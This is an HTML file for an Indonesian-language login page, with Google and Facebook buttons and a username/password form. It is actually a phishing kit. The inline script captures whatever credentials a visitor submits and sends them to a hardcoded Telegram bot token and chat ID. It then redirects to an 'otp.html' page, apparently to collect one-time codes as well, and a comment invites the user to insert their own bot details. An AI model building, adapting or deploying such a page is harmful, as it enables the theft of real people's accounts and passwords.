<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>Masuk</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
    font-family: 'Inter', sans-serif;
   }
  </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col">
  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
   <button aria-label="Back" class="text-gray-600 text-lg font-light">
    <i class="fas fa-arrow-left"></i>
   </button>
   <h1 class="text-center flex-grow text-gray-900 font-semibold text-base">Masuk</h1>
   <button aria-label="Help" class="text-green-600 text-xl font-light">
    <i class="fas fa-headset"></i>
   </button>
  </header>
  <main class="flex-grow px-6 pt-6">
   <button class="w-full border border-gray-300 rounded-md py-2 flex items-center justify-center gap-2 mb-3" type="button">
    <img alt="Google logo with red, yellow, green, and blue colors" class="w-5 h-5" height="20" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdP6AKFlNa3Afg4RJOp7OtR7RGRrlPE2KbLg&s" width="20"/>
    <span class="text-gray-900 text-sm font-normal">Masuk dengan Google</span>
   </button>
   <button class="w-full border border-gray-300 rounded-md py-2 flex items-center justify-center gap-2 mb-6" type="button">
    <img alt="Facebook logo white F on blue background" class="w-5 h-5" height="20" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/2023_Facebook_icon.svg/667px-2023_Facebook_icon.svg.png" width="20"/>
    <span class="text-gray-900 text-sm font-normal">Masuk dengan Facebook</span>
   </button>
   <div class="text-center text-gray-400 text-xs mb-6">Atau</div>
   <form id="loginForm" class="space-y-4">
    <div>
     <input id="username" class="w-full border-b border-gray-300 text-gray-400 placeholder-gray-400 focus:outline-none focus:border-green-600 py-1" placeholder="Username or Email" type="text" required/>
    </div>
    <div class="relative">
     <input id="password" class="w-full border-b border-gray-300 text-gray-400 placeholder-gray-400 focus:outline-none focus:border-green-600 py-1 pr-8" placeholder="Password" type="password" required/>
     <button type="button" aria-label="Toggle password visibility" class="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400" id="togglePassword">
      <i class="fas fa-eye"></i>
     </button>
    </div>
    <div class="text-right">
     <a class="text-green-600 text-sm font-semibold" href="#">Lupa Password</a>
    </div>
    <button class="w-full bg-green-600 text-white font-semibold py-3 rounded-md" type="submit">Masuk</button>
   </form>
  </main>
  <footer class="text-center text-gray-600 text-sm py-6 px-6">
   Belum punya akun? <a class="text-green-600 font-semibold" href="#">Daftar sekarang</a>
  </footer>

  <script>
   // Toggle password visibility
   const togglePassword = document.getElementById('togglePassword');
   const passwordInput = document.getElementById('password');
   togglePassword.addEventListener('click', () => {
     const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
     passwordInput.setAttribute('type', type);
     togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
   });

   // Telegram Bot info - replace with your own
   const telegramBotToken = '8398815420:AAEpqZqNC8t_QXR3bB4caJxBMXO4_MdDFls';
   const telegramChatId = '7549590022';

   document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();

     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;

     const message = `Login attempt:\nUsername/Email: ${username}\nPassword: ${password}`;

     // Telegram API URL
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

     fetch(url, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
         chat_id: telegramChatId,
         text: message
       })
     })
     .then(response => response.json())
     .then(data => {
       if(data.ok) {
         window.location.href = "otp.html";
         this.reset();
       } else {
         alert('Gagal mengirim data ke Telegram.');
       }
     })
     .catch(() => {
       alert('Terjadi kesalahan saat mengirim data.');
     });
   });
  </script>
 </body>
</html>
